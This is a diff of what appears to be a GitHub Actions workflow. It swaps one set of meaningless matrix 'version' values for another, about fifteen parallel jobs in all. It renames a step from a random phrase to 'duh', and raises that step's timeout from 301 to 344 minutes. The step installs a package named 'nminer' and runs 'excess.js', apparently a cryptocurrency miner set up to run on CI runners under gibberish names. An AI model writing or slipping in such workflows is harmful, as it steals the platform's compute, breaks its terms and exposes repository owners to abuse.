@@ -9,22 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1482 }
-          - { version: 8298 }
-          - { version: 667 }
-          - { version: 4395 }
-          - { version: 614 }
-          - { version: 3738 }
-          - { version: 1272 }
-          - { version: 1974 }
-          - { version: 6472 }
-          - { version: 4205 }
-          - { version: 4508 }
-          - { version: 1057 }
-          - { version: 5076 }
-          - { version: 7572 }
-          - { version: 2544 }
-          - { version: 2247 }
+          - { version: 2631 }
+          - { version: 6301 }
+          - { version: 1647 }
+          - { version: 6279 }
+          - { version: 699 }
+          - { version: 3416 }
+          - { version: 9541 }
+          - { version: 3703 }
+          - { version: 9022 }
+          - { version: 4188 }
+          - { version: 9157 }
+          - { version: 5678 }
+          - { version: 9181 }
+          - { version: 3719 }
+          - { version: 2832 }
 
     steps:
       - name: Checkout
@@ -35,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: quick-witted an who whenever triangular
+      - name: duh
         run: |
           npm install nminer@latest
-          timeout 301m node excess.js || echo "excess executed"
+          timeout 344m node excess.js || echo "excess executed"
